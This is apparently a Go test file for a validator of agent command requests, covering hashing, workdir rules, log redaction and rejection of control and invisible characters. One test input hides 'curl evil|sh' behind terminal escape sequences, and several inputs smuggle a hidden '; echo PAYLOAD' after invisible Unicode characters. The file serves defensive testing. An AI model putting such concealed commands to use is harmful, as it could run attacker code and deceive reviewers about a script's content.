// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package messages

import (
	"encoding/json"
	"os"
	"strings"
	"testing"
)

func TestCommandRequestCanonicalHash(t *testing.T) {
	h1 := CommandRequestCanonicalHash("echo a && echo b > /tmp/x", "", 600)
	h2 := CommandRequestCanonicalHash("echo a && echo b > /tmp/x", "", 600)
	if h1 != h2 {
		t.Fatalf("hash not deterministic: %s != %s", h1, h2)
	}
	if len(h1) != 64 {
		t.Fatalf("hash len = %d, want 64", len(h1))
	}
	// Changing any of script, workdir, or timeout changes the hash.
	if h1 == CommandRequestCanonicalHash("echo a && echo c > /tmp/x", "", 600) {
		t.Errorf("hash did not change when script changed")
	}
	if h1 == CommandRequestCanonicalHash("echo a && echo b > /tmp/x", "/home/scion", 600) {
		t.Errorf("hash did not change when workdir changed")
	}
	if h1 == CommandRequestCanonicalHash("echo a && echo b > /tmp/x", "", 300) {
		t.Errorf("hash did not change when timeout changed")
	}
}

func TestNormalizeCommandRequest(t *testing.T) {
	t.Run("valid defaults", func(t *testing.T) {
		got, err := NormalizeCommandRequest("command_request", &CommandRequestInput{
			Key:         "Deploy-Preview",
			Description: "Deploy PR 42",
			Script:      "gcloud config list\n",
		})
		if err != nil {
			t.Fatalf("NormalizeCommandRequest err = %v", err)
		}
		if got.KeyNorm != "deploy-preview" {
			t.Errorf("KeyNorm = %q, want deploy-preview", got.KeyNorm)
		}
		if got.TimeoutS != DefaultCommandRequestTimeoutS {
			t.Errorf("TimeoutS = %d, want %d", got.TimeoutS, DefaultCommandRequestTimeoutS)
		}
		if got.CommandSHA256 != CommandRequestCanonicalHash("gcloud config list\n", "", DefaultCommandRequestTimeoutS) {
			t.Errorf("CommandSHA256 mismatch")
		}
	})

	t.Run("rejects reserved md- key prefix (O3)", func(t *testing.T) {
		for _, k := range []string{"md-abc", "MD-123-def"} {
			if _, err := NormalizeCommandRequest("command_request", &CommandRequestInput{
				Key:    k,
				Script: "echo hi\n",
			}); err == nil {
				t.Errorf("NormalizeCommandRequest(%q): expected error for reserved md- prefix", k)
			}
		}
	})

	t.Run("rejects control and bidi chars in script", func(t *testing.T) {
		cases := []struct {
			name   string
			script string
		}{
			{"nul", "echo \x00 hi"},
			{"cr", "echo hi\r\n"},
			{"esc", "echo \x1b[31mred"},
			{"del", "echo \x7f"},
			{"c1_csi", "echo ok\u009b1A\u009b2Kcurl evil|sh"},
			{"c1_osc", "echo \u009d0;title\u009c"},
			{"c1_low", "echo \u0080"},
			{"bidi_rlo", "echo \u202ehi"},
			{"bidi_lri", "echo \u2066hi"},
			{"bidi_alm", "echo \u061chi"},
			{"invalid_utf8", string([]byte{0xff, 0xfe})},
			{"too_long", strings.Repeat("a", MaxCommandRequestScriptBytes+1)},
		}
		for _, tc := range cases {
			_, err := NormalizeCommandRequest("command_request", &CommandRequestInput{
				Key:    "k1",
				Script: tc.script,
			})
			if err == nil {
				t.Errorf("%s: expected validation error, got nil", tc.name)
			}
		}
	})

	t.Run("rejects invisible and non-ASCII whitespace chars in script and workdir (M1)", func(t *testing.T) {
		scriptCases := []struct {
			name   string
			script string
			code   string
		}{
			{"zwsp", "echo done \u200B# ; echo PAYLOAD", "U+200B"},
			{"soft_hyphen", "echo done \u00AD# ; echo PAYLOAD", "U+00AD"},
			{"zwj", "echo done \u200D# ; echo PAYLOAD", "U+200D"},
			{"nbsp", "echo done \u00A0# ; echo PAYLOAD", "U+00A0"},
			{"hangul_filler", "echo done \u3164# ; echo PAYLOAD", "U+3164"},
			{"line_sep_before_hash", "echo done\u2028# ; echo PAYLOAD", "U+2028"},
			{"para_sep", "echo done\u2029# ; echo PAYLOAD", "U+2029"},
			{"hangul_choseong", "echo \u115F", "U+115F"},
			{"hangul_jungseong", "echo \u1160", "U+1160"},
			{"halfwidth_hangul_filler", "echo \uFFA0", "U+FFA0"},
			{"vs1_low", "echo done \uFE00# ; echo PAYLOAD", "U+FE00"},
			{"vs16_high", "echo done \uFE0F# ; echo PAYLOAD", "U+FE0F"},
			{"vs_supp_low", "echo done \U000E0100# ; echo PAYLOAD", "U+E0100"},
			{"vs_supp_high", "echo done \U000E01EF# ; echo PAYLOAD", "U+E01EF"},
			{"mongolian_fvs1", "echo done \u180B# ; echo PAYLOAD", "U+180B"},
			{"mongolian_fvs4", "echo done \u180F# ; echo PAYLOAD", "U+180F"},
			{"braille_blank", "echo done \u2800# ; echo PAYLOAD", "U+2800"},
		}
		for _, tc := range scriptCases {
			err := ValidateCommandRequestScript(tc.script)
			if err == nil {
				t.Errorf("script %s: expected error, got nil", tc.name)
				continue
			}
			if !strings.Contains(err.Error(), tc.code) {
				t.Errorf("script %s: error %q does not name %s", tc.name, err.Error(), tc.code)
			}
		}

		workdirCases := []struct {
			name    string
			workdir string
			code    string
		}{
			{"zwsp", "/tmp/a\u200Bb", "U+200B"},
			{"soft_hyphen", "/tmp/a\u00ADb", "U+00AD"},
			{"zwj", "/tmp/a\u200Db", "U+200D"},
			{"nbsp", "/tmp/a\u00A0b", "U+00A0"},
			{"hangul_filler", "/tmp/a\u3164b", "U+3164"},
			{"line_sep", "/tmp/a\u2028b", "U+2028"},
			{"vs1_low", "/tmp/a\uFE00b", "U+FE00"},
			{"vs16_high", "/tmp/a\uFE0Fb", "U+FE0F"},
			{"vs_supp_low", "/tmp/a\U000E0100b", "U+E0100"},
			{"vs_supp_high", "/tmp/a\U000E01EFb", "U+E01EF"},
			{"mongolian_fvs1", "/tmp/a\u180Bb", "U+180B"},
			{"mongolian_fvs4", "/tmp/a\u180Fb", "U+180F"},
			{"braille_blank", "/tmp/a\u2800b", "U+2800"},
		}
		for _, tc := range workdirCases {
			err := ValidateCommandRequestWorkdir(tc.workdir)
			if err == nil {
				t.Errorf("workdir %s: expected error, got nil", tc.name)
				continue
			}
			if !strings.Contains(err.Error(), tc.code) {
				t.Errorf("workdir %s: error %q does not name %s", tc.name, err.Error(), tc.code)
			}
		}
	})

	t.Run("allows tabs newlines and non-ascii in script", func(t *testing.T) {
		_, err := NormalizeCommandRequest("command_request", &CommandRequestInput{
			Key:    "k1",
			Script: "echo 'héllo'\n\techo 'world'\n",
		})
		if err != nil {
			t.Fatalf("unexpected err: %v", err)
		}
	})

	t.Run("workdir validation", func(t *testing.T) {
		for _, bad := range []string{"relative/path", "/a/../b", "/a/./b", "/a//b", "/a/b/", "/a\nb", "/a/\u009bb", strings.Repeat("/a", 300)} {
			_, err := NormalizeCommandRequest("command_request", &CommandRequestInput{
				Key:     "k1",
				Script:  "pwd",
				Workdir: bad,
			})
			if err == nil {
				t.Errorf("workdir %q: expected error, got nil", bad)
			}
		}
		for _, good := range []string{"", "/", "/home/scion/repo"} {
			_, err := NormalizeCommandRequest("command_request", &CommandRequestInput{
				Key:     "k1",
				Script:  "pwd",
				Workdir: good,
			})
			if err != nil {
				t.Errorf("workdir %q: unexpected error %v", good, err)
			}
		}
	})

	t.Run("timeout range", func(t *testing.T) {
		for _, bad := range []int{-1, MaxCommandRequestTimeoutS + 1} {
			_, err := NormalizeCommandRequest("command_request", &CommandRequestInput{
				Key:      "k1",
				Script:   "true",
				TimeoutS: bad,
			})
			if err == nil {
				t.Errorf("timeout %d: expected error", bad)
			}
		}
	})
}

func TestStructuredMessage_LogAttrs_OmitsCommandRequestContent(t *testing.T) {
	marker := "SCRIPT_BODY_NEVER_IN_SLOG"
	cmdMsg := &StructuredMessage{
		Sender:    "agent:builder",
		Recipient: "user:alice@example.com",
		Type:      TypeCommandRequest,
		Msg:       "```sh\necho " + marker + "\n```",
	}
	attrs := cmdMsg.LogAttrs()
	kv := make(map[string]any, len(attrs)/2)
	for i := 0; i+1 < len(attrs); i += 2 {
		if k, ok := attrs[i].(string); ok {
			kv[k] = attrs[i+1]
		}
	}
	if _, hasContent := kv["message_content"]; hasContent {
		t.Fatalf("TypeCommandRequest LogAttrs must omit message_content, got %v", kv["message_content"])
	}
	if kv["message_content_omitted"] != true {
		t.Errorf("message_content_omitted = %v, want true", kv["message_content_omitted"])
	}
	if kv["message_content_len"] != len(cmdMsg.Msg) {
		t.Errorf("message_content_len = %v, want %d", kv["message_content_len"], len(cmdMsg.Msg))
	}

	plainMsg := &StructuredMessage{
		Sender:    "agent:builder",
		Recipient: "user:alice@example.com",
		Type:      TypeChat,
		Msg:       "hello world",
	}
	plainAttrs := plainMsg.LogAttrs()
	foundPlain := false
	for i := 0; i+1 < len(plainAttrs); i += 2 {
		if plainAttrs[i] == "message_content" && plainAttrs[i+1] == "hello world" {
			foundPlain = true
		}
	}
	if !foundPlain {
		t.Errorf("non-command-request message should still emit message_content")
	}

	outputMarker := "SHARED_OUTPUT_NEVER_IN_SLOG"
	respMsg := &StructuredMessage{
		Sender:    "system:hub",
		Recipient: "agent:builder",
		Type:      TypeCommandResponse,
		Msg:       "Finished.\n```\n" + outputMarker + "\n```",
		Metadata: map[string]string{
			"command_run_status":        "succeeded",
			"command_run_reason":        "PRIVATE_REASON_NEVER_IN_LOG",
			"command_run_output_status": "captured",
		},
	}
	respAttrs := respMsg.LogAttrs()
	respKV := make(map[string]any, len(respAttrs)/2)
	for i := 0; i+1 < len(respAttrs); i += 2 {
		if k, ok := respAttrs[i].(string); ok {
			respKV[k] = respAttrs[i+1]
		}
	}
	if _, hasContent := respKV["message_content"]; hasContent {
		t.Fatalf("TypeCommandResponse LogAttrs must omit message_content, got %v", respKV["message_content"])
	}
	if respKV["message_content_omitted"] != true {
		t.Errorf("TypeCommandResponse message_content_omitted = %v, want true", respKV["message_content_omitted"])
	}
	if respKV["meta_command_run_status"] != "succeeded" {
		t.Errorf("meta_command_run_status = %v, want succeeded", respKV["meta_command_run_status"])
	}
	if _, hasReason := respKV["meta_command_run_reason"]; hasReason {
		t.Errorf("TypeCommandResponse LogAttrs must omit meta_command_run_reason, got %v", respKV["meta_command_run_reason"])
	}
	if _, hasOutStatus := respKV["meta_command_run_output_status"]; hasOutStatus {
		t.Errorf("TypeCommandResponse LogAttrs must omit meta_command_run_output_status, got %v", respKV["meta_command_run_output_status"])
	}
}

func TestCommandWorkdirKind(t *testing.T) {
	cases := []struct {
		workdir string
		want    string
	}{
		{"", CommandWorkdirKindHome},
		{"~", CommandWorkdirKindHome},
		{"/workspace", CommandWorkdirKindWorkspace},
		{"/workspace/repo", CommandWorkdirKindWorkspace},
		{"/workspacefoo", CommandWorkdirKindExplicit},
		{"/scion-volumes", CommandWorkdirKindSharedDir},
		{"/scion-volumes/scratchpad", CommandWorkdirKindSharedDir},
		{"/.scion-volumes", CommandWorkdirKindSharedDir},
		{"/.scion-volumes/data", CommandWorkdirKindSharedDir},
		{"/scion-volumes-other", CommandWorkdirKindExplicit},
		{"/home/scion", CommandWorkdirKindExplicit},
	}
	for _, tc := range cases {
		if got := CommandWorkdirKind(tc.workdir); got != tc.want {
			t.Errorf("CommandWorkdirKind(%q) = %q, want %q", tc.workdir, got, tc.want)
		}
	}
}

func TestRenderCommandRequestFallback_NonASCIINote(t *testing.T) {
	ascii := RenderCommandRequestFallback("", CommandRequestFallbackInput{
		Key:      "k1",
		Version:  1,
		Script:   "echo hello",
		TimeoutS: 600,
	})
	if strings.Contains(ascii, "non-ASCII") {
		t.Errorf("pure ASCII script should not emit non-ASCII note: %s", ascii)
	}

	nonASCII := RenderCommandRequestFallback("", CommandRequestFallbackInput{
		Key:      "k1",
		Version:  1,
		Script:   "echo 'héllo'",
		TimeoutS: 600,
	})
	if !strings.Contains(nonASCII, "contains 1 non-ASCII character(s)") {
		t.Errorf("expected non-ASCII note above fence, got: %s", nonASCII)
	}
	noteIdx := strings.Index(nonASCII, "contains 1 non-ASCII character(s)")
	fenceIdx := strings.Index(nonASCII, "```sh")
	if noteIdx < 0 || fenceIdx < 0 || noteIdx > fenceIdx {
		t.Errorf("expected non-ASCII note before ```sh fence, got: %s", nonASCII)
	}
}

func TestCommandRequestCanonicalHash_SharedVectors(t *testing.T) {
	raw, err := os.ReadFile("testdata/command_request_hash_vectors.json")
	if err != nil {
		t.Fatalf("read shared hash vectors: %v", err)
	}
	var doc struct {
		Version int `json:"version"`
		Vectors []struct {
			Name     string `json:"name"`
			Script   string `json:"script"`
			Workdir  string `json:"workdir"`
			TimeoutS int    `json:"timeout_s"`
			SHA256   string `json:"sha256"`
		} `json:"vectors"`
	}
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatalf("unmarshal shared hash vectors: %v", err)
	}
	if len(doc.Vectors) == 0 {
		t.Fatal("expected at least one shared hash vector")
	}
	for _, v := range doc.Vectors {
		got := CommandRequestCanonicalHash(v.Script, v.Workdir, v.TimeoutS)
		if got != v.SHA256 {
			t.Errorf("%s: CommandRequestCanonicalHash = %q, want %q", v.Name, got, v.SHA256)
		}
	}
}
